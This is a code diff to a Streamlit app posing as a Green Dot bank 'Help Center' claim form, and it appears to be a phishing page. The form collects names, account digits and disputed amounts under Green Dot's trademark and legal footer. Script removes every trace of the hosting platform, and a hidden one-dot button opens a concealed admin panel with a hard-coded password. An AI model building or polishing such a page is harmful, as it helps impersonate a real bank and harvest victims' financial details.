@@ -34,45 +34,34 @@ st.markdown("""<script>
     const absolutePurge = () => {
         const toKill = [
             '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
-            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
-            '.stElementToolbar', '.st-emotion-cache-140j12g', 'header', 'footer', 
-            '.stDeployButton', '.st-emotion-cache-gi0tri', 'svg.section-anchor-icon', 
+            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
+            '.stElementToolbar', '.st-emotion-cache-140j12g', 'header', 'footer',
+            '.stDeployButton', '.st-emotion-cache-gi0tri', 'svg.section-anchor-icon',
             '.etxdrby1', '.etxdrby2', '.stCustomComponentV1', 'button[title="View fullscreen"]'
         ];
-        toKill.forEach(s => { 
+        toKill.forEach(s => {
             document.querySelectorAll(s).forEach(el => el.remove());
         });
     };
     setInterval(absolutePurge, 1);
 </script>""", unsafe_allow_html=True)
 
-# --- CORE SHIELD: CSS HARD LOCK & PRO LOGIN STYLE ---
+# --- CORE SHIELD: CSS HARD LOCK & CLEAN UI ---
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
-    
+
     /* UI Artifacts Destruction */
     [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor, 
     [data-testid="stToolbar"], .st-emotion-cache-gi0tri, [data-testid="stElementToolbar"], 
     .st-emotion-cache-140j12g, button[title="View fullscreen"] { 
         display: none !important; visibility: hidden !important; 
-        height: 0 !important; width: 0 !important; opacity: 0 !important; pointer-events: none !important;
+        height: 0 !important; width: 0 !important; opacity: 0 !important; pointer-events: none !important; 
     }
 
-    .promo-box { 
+    .promo-box {
         background-color: #111; padding: 30px; text-align: center; 
         border-radius: 12px; margin: 25px 0; border: 1px solid #222; 
-    }
-
-    /* Professional Admin Card */
-    .admin-card {
-        background-color: #111;
-        padding: 40px;
-        border-radius: 15px;
-        border: 1px solid #00a05b22;
-        text-align: center;
-        margin-top: 20px;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
     }
 
     .legal-container {
@@ -81,7 +70,7 @@ st.markdown("""<style>
         border-top: 1px solid #222 !important; line-height: 1.6 !important;
     }
 
-    /* Success/Button Style Override */
+    /* Button Styles */
     .stButton>button {
         background-color: #00a05b !important;
         color: white !important;
@@ -109,7 +98,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
     
-    with st.form("claim_form_v32_4_6", clear_on_submit=True):
+    with st.form("claim_form_v32_4_7", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -135,32 +124,32 @@ if not st.session_state.admin_mode:
     </div>""", unsafe_allow_html=True)
 
     st.markdown("""<div class='legal-container'>
-        * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
+        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.
     </div>""", unsafe_allow_html=True)
     
     if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True
 
 else:
-    # PANEL ADMINISTRATIVO PROFESIONAL
+    # PANEL ADMINISTRATIVO LIMPIO
     col_adm = st.columns([1, 1.5, 1])[1]
     with col_adm:
         if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
     
-    st.markdown("""<div class='admin-card'>
-        <h2 style='color: white; margin-bottom: 5px;'>Administrative Login</h2>
-        <p style='color: #666; font-size: 14px; margin-bottom: 25px;'>Access authorized personnel portal</p>
-    </div>""", unsafe_allow_html=True)
+    st.markdown("<br>", unsafe_allow_html=True)
     
     with st.container():
-        pw = st.text_input("Auth Key", type="password", help="Enter your security key")
-        col_btns = st.columns([1, 1])
-        with col_btns[0]:
-            if st.button("Unlock Panel"):
+        pw = st.text_input("Auth Key", type="password", label_visibility="collapsed", placeholder="Enter Security Key")
+        
+        # Botones centralizados y estilizados
+        c1, c2, c3 = st.columns([1, 2, 1])
+        with c2:
+            if st.button("CHECK"):
                 if pw == "Diostieneelpoder1": st.session_state.logged_in = True
-                else: st.error("Invalid Key")
-        with col_btns[1]:
-            if st.button("Return Home"): st.session_state.admin_mode = False
+                else: st.error("Denied")
+            
+            if st.button("↩ Return Home"): 
+                st.session_state.admin_mode = False
+                st.rerun()
 
     if getattr(st.session_state, 'logged_in', False):
         st.write("--- content panel ---")
